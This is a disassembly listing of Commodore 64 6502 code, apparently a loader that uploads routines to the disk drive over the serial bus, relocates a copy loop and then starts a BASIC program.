; basic stub
0800 .byte $00,$0b,$08,$c8,$07,$9e,$32,$30,$35,$39,$00

start
.C:080b   2C 00 DD   BIT $DD00
.C:080e   10 49      BPL $0859
.C:0810   A9 0F      LDA #$0F
.C:0812   85 FF      STA $FF
.C:0814   A0 00      LDY #$00
.C:0816   8C A0 08   STY $08A0
.C:0819   20 A4 08   JSR $08A4
.C:081c   A2 05      LDX #$05
.C:081e   BD 9E 08   LDA $089E,X
.C:0821   20 DD ED   JSR $EDDD
.C:0824   CA         DEX
.C:0825   10 F7      BPL $081E
.C:0827   A2 20      LDX #$20
.C:0829   B9 FD 07   LDA $07FD,Y
.C:082c   20 DD ED   JSR $EDDD
.C:082f   C8         INY
.C:0830   D0 0D      BNE $083F

.C:0832   EE 2B 08   INC $082B
.C:0835   EE 9F 08   INC $089F
.C:0838   C8         INY
.C:0839   C8         INY
.C:083a   A9 FB      LDA #$FB
.C:083c   8D 2A 08   STA $082A
.C:083f   CA         DEX
.C:0840   D0 E7      BNE $0829

.C:0842   20 AE FF   JSR $FFAE
.C:0845   C6 FF      DEC $FF
.C:0847   D0 CD      BNE $0816
.C:0849   20 A4 08   JSR $08A4
.C:084c   A9 55      LDA #$55
.C:084e   20 DD ED   JSR $EDDD
.C:0851   A9 34      LDA #$34
.C:0853   20 DD ED   JSR $EDDD
.C:0856   20 AE FF   JSR $FFAE
.C:0859   A0 36      LDY #$36

.C:085b   B9 67 08   LDA $0867,Y
.C:085e   99 FC 00   STA $00FC,Y
.C:0861   88         DEY
.C:0862   10 F7      BPL $085B
.C:0864   4C 00 01   JMP $0100

.C:0867   04 07      NOOP $07
.C:0869   00         BRK
.C:086a   09 
	  
.C:086b   A9 36      LDA #$36
.C:086d   85 01      STA $01
.C:086f   A6 AF      LDX $AF
.C:0871   A0 FD      LDY #$FD
.C:0873   B1 FE      LDA ($FE),Y
.C:0875   91 FC      STA ($FC),Y
.C:0877   C8         INY
.C:0878   D0 04      BNE $087E
.C:087a   E6 FD      INC $FD
.C:087c   E6 FF      INC $FF
.C:087e   C4 AE      CPY $AE
.C:0880   D0 F1      BNE $0873
.C:0882   E4 FF      CPX $FF
.C:0884   D0 ED      BNE $0873
.C:0886   98         TYA
.C:0887   38         SEC
.C:0888   E9 FC      SBC #$FC
.C:088a   85 AE      STA $AE
.C:088c   85 2D      STA $2D
.C:088e   A5 FF      LDA $FF
.C:0890   E9 01      SBC #$01
.C:0892   85 AF      STA $AF
.C:0894   85 2E      STA $2E
.C:0896   E6 01      INC $01
.C:0898   20 59 A6   JSR $A659
.C:089b   4C AE A7   JMP $A7AE

.C:089e   20 04 A0   JSR $A004
.C:08a1   57 2D      SRE $2D,X
.C:08a3   4D A9 08   EOR $08A9
.C:08a6   20 0C ED   JSR $ED0C
.C:08a9   A9 6F      LDA #$6F
.C:08ab   4C B9 ED   JMP $EDB9
.C:08ae   A9 90      LDA #$90
.C:08b0   2C A9 80   BIT $80A9
.C:08b3   A2 03      LDX #$03
.C:08b5   95 00      STA $00,X
.C:08b7   B5 00      LDA $00,X
.C:08b9   30 FC      BMI $08B7
.C:08bb   C9 01      CMP #$01
.C:08bd   F0 02      BEQ $08C1
.C:08bf   68         PLA
.C:08c0   68         PLA
.C:08c1   60         RTS

.C:08c2   A0 02      LDY #$02
.C:08c4   A9 00      LDA #$00
.C:08c6   91 C0      STA ($C0),Y
.C:08c8   A0 04      LDY #$04
.C:08ca   B1 C0      LDA ($C0),Y
.C:08cc   A2 03      LDX #$03
.C:08ce   DD C6 05   CMP $05C6,X
.C:08d1   F0 05      BEQ $08D8
.C:08d3   CA         DEX
.C:08d4   10 F8      BPL $08CE
.C:08d6   30 09      BMI $08E1
.C:08d8   BD F6 04   LDA $04F6,X
.C:08db   49 FF      EOR #$FF
.C:08dd   25 C3      AND $C3
.C:08df   85 C3      STA $C3
.C:08e1   4C 4F 05   JMP $054F

.C:08e4   A9 00      LDA #$00
.C:08e6   85 0D      STA $0D
.C:08e8   20 B4 04   JSR $04B4
.C:08eb   A5 C3      LDA $C3
.C:08ed   8D A7 06   STA $06A7
.C:08f0   4C B1 04   JMP $04B1
.C:08f3   08         PHP
.C:08f4   04 02      NOOP $02
.C:08f6   01 0F      ORA ($0F,X)
.C:08f8   4C C5 04   JMP $04C5

.C:08fb   00         BRK
.C:08fc   00         BRK
.C:08fd   00         BRK

.C:08fe   A0 02      LDY #$02
.C:0900   8C 00 18   STY $1800
.C:0903   A9 08      LDA #$08
.C:0905   8D 03 04   STA $0403
